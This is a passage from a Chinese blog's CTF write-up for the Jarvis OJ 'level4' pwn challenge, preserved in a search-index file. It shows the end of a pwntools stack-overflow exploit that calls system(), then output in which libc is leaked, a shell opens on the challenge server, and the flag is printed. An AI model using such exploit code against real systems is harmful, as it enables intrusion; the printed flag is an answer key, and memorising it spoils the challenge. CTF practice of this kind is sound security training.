class="line">payload = <span class="string">'A'</span> * (<span class="number">0x88</span> + <span class="number">4</span>) + p32(system_addr) + p32(useless_addr) + p32(bss_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p><p>执行效果：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[+] Opening connection to pwn2.jarvisoj.com on port 9880: Done</span><br><span class="line">[*] <span class="string">'/mnt/hgfs/ctf/pwn/jarvis/level4'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">[+] Loading from <span class="string">'/mnt/hgfs/ctf/pwn/jarvis/level4'</span>: 0xf77de930</span><br><span class="line">[+] Resolving <span class="string">'system'</span> <span class="keyword">in</span> <span class="string">'libc.so'</span>: 0xf77de930</span><br><span class="line">[!] No ELF provided.  Leaking is much faster <span class="keyword">if</span> you have a copy of the ELF being leaked.</span><br><span class="line">[*] Trying lookup based on Build ID: de799a85b2ebc2929eb4585f009d0c5e6211f2f8</span><br><span class="line">[*] Skipping unavialable libc de799a85b2ebc2929eb4585f009d0c5e6211f2f8</span><br><span class="line">[*] .gnu.hash/.<span class="built_in">hash</span>, .strtab and .symtab offsets</span><br><span class="line">[*] Found DT_GNU_HASH at 0xf77afdd8</span><br><span class="line">[*] Found DT_STRTAB at 0xf77afde0</span><br><span class="line">[*] Found DT_SYMTAB at 0xf77afde8</span><br><span class="line">[*] .gnu.hash parms</span><br><span class="line">[*] <span class="built_in">hash</span> chain index</span><br><span class="line">[*] <span class="built_in">hash</span> chain</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ cat flag</span><br><span class="line">CTF&#123;882130cf51d65fb705440b218e94e98e&#125;</span><br><span class="line">$</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> 玩安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
